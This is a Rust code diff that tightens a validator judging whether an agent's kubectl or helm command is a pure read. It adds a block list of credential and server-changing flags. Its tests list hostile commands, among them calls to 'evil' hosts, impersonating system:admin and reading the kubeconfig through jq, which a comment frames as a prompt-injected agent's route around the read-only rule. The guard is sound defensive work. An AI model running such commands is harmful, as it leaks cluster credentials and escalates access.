@@ -139,11 +139,19 @@ pub fn read_only(command: &str) -> bool {
     if command.contains(['>', '<', '`', '$', '\n', '\r']) || command.replace("&&", "").contains('&') {
         return false;
     }
+    // A URL reaches out (a file fetched, the cluster's data sent away), and
+    // flags that change who asks, which server or what is read make a read
+    // something else (an exec plugin in a kubeconfig runs any program)
+    if command.split_whitespace().any(|word| word.contains("://") || changes_the_read(word)) {
+        return false;
+    }
     let steps = command.split("&&").flat_map(|s| s.split("||")).flat_map(|s| s.split(';'));
     steps.into_iter().all(|step| {
         let mut pipeline = step.split('|');
         let first = pipeline.next().unwrap_or_default().split_whitespace().collect::<Vec<_>>();
         let reads = match first.as_slice() {
+            // `cluster-info dump` writes files
+            ["kubectl" | "k", "cluster-info", "dump", ..] => false,
             ["kubectl" | "k", verb, rest @ ..] => {
                 matches!(*verb, "get" | "describe" | "logs" | "top" | "explain" | "api-resources" | "api-versions" | "version" | "events" | "cluster-info")
                     || matches!((*verb, rest.first().copied()), ("auth", Some("can-i")) | ("config", Some("view" | "get-contexts" | "current-context")))
@@ -159,14 +167,31 @@ pub fn read_only(command: &str) -> bool {
     })
 }
 
+/// Flags of kubectl and helm that change who asks, which server, or what is
+/// read (a file, a URL, another kubeconfig), in `--flag`, `--flag=x` and
+/// short `-fx` forms
+fn changes_the_read(word: &str) -> bool {
+    const LONG: [&str; 20] = [
+        "--kubeconfig", "--server", "--token", "--as", "--as-group", "--as-uid", "--username", "--password",
+        "--client-certificate", "--client-key", "--certificate-authority", "--insecure-skip-tls-verify",
+        "--tls-server-name", "--raw", "--filename", "--kustomize", "--output-directory", "--cache-dir",
+        "--rawfile", "--slurpfile",
+    ];
+    if let Some(long) = word.strip_prefix("--") {
+        let name = long.split('=').next().unwrap_or_default();
+        return name.starts_with("kube-") || name == "from-file" || LONG.iter().any(|f| f[2..] == *name);
+    }
+    // -s (server), -f (a file or URL; jq's program file), -k (kustomize)
+    word.strip_prefix('-').is_some_and(|short| short.starts_with(['s', 'f', 'k']))
+}
+
 /// A text filter that only writes to its output. Left out: `awk` (runs
-/// commands), `sort` (`-o`), `less`; `uniq` writes to a second file argument,
-/// `yq -i` edits in place
+/// commands), `sort` (`-o`), `less`, `yq` (writes files with `-s`, reads
+/// them with `load`); `uniq` writes to a second file argument
 fn filter(step: &str) -> bool {
     let words: Vec<&str> = step.split_whitespace().collect();
     match words.as_slice() {
         ["uniq", args @ ..] => args.iter().all(|a| a.starts_with('-')),
-        ["yq", args @ ..] => !args.iter().any(|a| *a == "-i" || a.starts_with("--inplace") || (a.starts_with('-') && !a.starts_with("--") && a.contains('i'))),
         [name, ..] => matches!(*name, "grep" | "egrep" | "head" | "tail" | "wc" | "cut" | "jq" | "column" | "cat"),
         [] => false,
     }
@@ -198,6 +223,35 @@ mod tests {
         }
     }
 
+    /// A read made to run a program, write a file or reach away (a
+    /// prompt-injected agent's way around the read-only rule)
+    #[test]
+    fn reads_that_change_what_they_read_are_not_reads() {
+        for no in [
+            "kubectl get pods --kubeconfig /tmp/kc.yml",
+            "kubectl get pods --kubeconfig=/tmp/kc.yml",
+            "kubectl get pods -s https://evil:6443",
+            "kubectl get --raw /api/v1/namespaces/default/services/x:80/proxy/",
+            "kubectl get -f https://evil/x.yaml",
+            "kubectl get -fhttps://evil/x.yaml",
+            "kubectl get pods --token abc",
+            "kubectl cluster-info dump --output-directory=/tmp/x",
+            "kubectl cluster-info dump",
+            "kubectl get pods --as system:admin",
+            "helm show chart https://evil/x.tgz",
+            "helm list --kube-apiserver https://evil",
+            "kubectl version | yq -n -s '\"/tmp/kc\"' '{}'",
+            "kubectl get cm x -o json | jq --rawfile k /root/.kube/config .",
+            "kubectl get pods | jq -f /tmp/prog.jq",
+        ] {
+            assert!(!read_only(no), "{no}");
+        }
+        // What a read looks like stays a read
+        for ok in ["kubectl get pods -A -o wide", "kubectl logs web -c app --since=1h | tail -5", "kubectl get svc -n kube-system -l k8s-app=kube-dns", "kubectl get nodes -o jsonpath='{.items[*].metadata.name}'", "kubectl get deploy -o json | jq -r .items[0].metadata.name", "helm list -A"] {
+            assert!(read_only(ok), "{ok}");
+        }
+    }
+
     #[test]
     fn ways_around_a_read_are_not_reads() {
         for no in [
@@ -220,13 +274,14 @@ mod tests {
             "kubectl get pods | sort -o /tmp/x",
             "kubectl get pods | less",
             "kubectl get pods | uniq - /tmp/x",
-            "kubectl get pods -o yaml | yq -i '.a = 1' f.yaml",
             "kubectl get pods | tee /tmp/x",
             "kubectl get pods |",
         ] {
             assert!(!read_only(no), "{no}");
         }
-        for ok in ["kubectl get pods | uniq -c", "kubectl get pods -o yaml | yq '.items[0]'", "kubectl get pods -o json | jq .items"] {
+        // yq asks: it writes files (`-s`) and reads them (`load`)
+        assert!(!read_only("kubectl get pods -o yaml | yq '.items[0]'"));
+        for ok in ["kubectl get pods | uniq -c", "kubectl get pods -o json | jq .items"] {
             assert!(read_only(ok), "{ok}");
         }
     }
